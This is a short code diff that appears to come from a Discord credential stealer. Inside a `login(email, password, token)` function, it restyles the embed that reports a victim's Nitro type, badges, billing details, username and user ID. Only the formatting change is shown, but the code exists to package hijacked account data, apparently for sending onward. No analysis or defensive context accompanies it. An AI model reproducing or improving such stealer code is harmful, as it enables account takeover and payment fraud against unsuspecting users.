@@ -675,20 +675,10 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
-            value: `${badges}`,
-            inline: true,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: false,
           },
-          {
-            name: '<a:9048bluemendedheart:986020801004318740> @SN - Nitro Type:',
-             value: `${nitro}`,
-            inline: true,
-           },
-          {
-            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
-            value: `${billing}`,
-            inline: true,
-           },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
